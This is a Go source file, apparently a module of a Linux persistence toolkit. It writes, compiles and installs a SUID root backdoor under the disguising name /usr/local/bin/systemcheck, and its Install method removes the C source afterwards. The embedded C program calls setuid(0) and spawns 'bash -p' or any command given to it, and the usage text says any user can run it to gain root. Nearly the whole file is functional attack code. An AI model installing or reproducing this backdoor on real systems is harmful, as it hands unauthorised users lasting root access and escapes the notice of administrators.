//go:build linux

package techniques

import (
	"fmt"
	"os"
	"os/exec"
)

type SUIDBinary struct {
	binaryPath string
}

func NewSUIDBinary() Technique {
	return &SUIDBinary{
		binaryPath: "/usr/local/bin/systemcheck",
	}
}

func (s *SUIDBinary) Name() string {
	return "SUID Backdoor Binary"
}

func (s *SUIDBinary) Description() string {
	return "Custom SUID binary for privilege escalation"
}

func (s *SUIDBinary) StealthLevel() string {
	return "low"
}

func (s *SUIDBinary) SurvivesReboot() bool {
	return true
}

func (s *SUIDBinary) Install() error {
	// Create C source for SUID binary
	sourceCode := `#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
    setuid(0);
    setgid(0);
    
    if (argc > 1) {
        execvp(argv[1], &argv[1]);
    } else {
        char *args[] = {"/bin/bash", "-p", NULL};
        execvp("/bin/bash", args);
    }
    
    return 0;
}
`
	
	tmpSource := "/tmp/suid_backdoor.c"
	if err := os.WriteFile(tmpSource, []byte(sourceCode), 0644); err != nil {
		return fmt.Errorf("write source code: %w", err)
	}
	
	// Compile the binary
	cmd := exec.Command("gcc", "-o", s.binaryPath, tmpSource)
	if err := cmd.Run(); err != nil {
		// Try with musl-gcc if gcc fails
		cmd = exec.Command("musl-gcc", "-static", "-o", s.binaryPath, tmpSource)
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("compile SUID binary: %w", err)
		}
	}
	
	// Set SUID bit
	if err := os.Chmod(s.binaryPath, 04755); err != nil {
		return fmt.Errorf("set SUID bit: %w", err)
	}
	
	// Cleanup
	os.Remove(tmpSource)
	
	return nil
}

func (s *SUIDBinary) Remove() error {
	return os.Remove(s.binaryPath)
}

func (s *SUIDBinary) Details() string {
	return fmt.Sprintf(`SUID binary created: %s
Permissions: -rwsr-xr-x (4755)

Usage:
  %s              # Get root shell
  %s whoami       # Run command as root
  %s id           # Verify root access

Any user can execute this to gain root privileges.
`, s.binaryPath, s.binaryPath, s.binaryPath, s.binaryPath)
}
